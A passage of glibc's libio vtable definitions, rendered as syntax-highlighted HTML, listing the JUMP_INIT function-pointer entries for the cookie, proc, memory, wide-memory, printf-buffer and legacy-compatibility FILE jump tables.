    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_cookie_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_cookie_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_cookie_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_cookie_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_cookie_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_proc_jumps  */</span>
  <span class="token punctuation">[</span>IO_PROC_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_new_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_new_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_new_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_new_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_new_file_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_new_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_new_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_new_proc_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_mem_jumps  */</span>
  <span class="token punctuation">[</span>IO_MEM_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_mem_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_str_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_str_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_str_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_default_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_str_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_default_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_mem_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_default_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_default_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_default_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_default_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_default_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_wmem_jumps  */</span>
  <span class="token punctuation">[</span>IO_WMEM_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_wmem_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">)</span> _IO_wstr_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wstr_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wdefault_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">)</span> _IO_wstr_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_wdefault_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_wdefault_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_wstr_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_default_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_wmem_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_wdefault_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_default_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_default_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_default_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_default_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span>IO_PRINTF_BUFFER_AS_FILE_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> __printf_buffer_as_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> __printf_buffer_as_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span>IO_WPRINTF_BUFFER_AS_FILE_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">)</span> __wprintf_buffer_as_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> __wprintf_buffer_as_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">SHLIB_COMPAT</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">,</span> GLIBC_2_1<span class="token punctuation">)</span></span></span>
  <span class="token comment">/* _IO_old_file_jumps  */</span>
  <span class="token punctuation">[</span>IO_OLD_FILE_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_old_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_old_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_old_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_old_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_old_file_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_old_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_old_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_old_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/*  _IO_old_proc_jumps  */</span>
  <span class="token punctuation">[</span>IO_OLD_PROC_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_old_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_old_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_old_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_old_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_old_file_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_old_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_old_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_old_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_old_proc_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">SHLIB_COMPAT</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">,</span> GLIBC_2_2<span class="token punctuation">)</span></span></span>
  <span class="token comment">/* _IO_old_cookie_jumps  */</span>
  <span class="token punctuation">[</span>IO_OLD_COOKIED_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
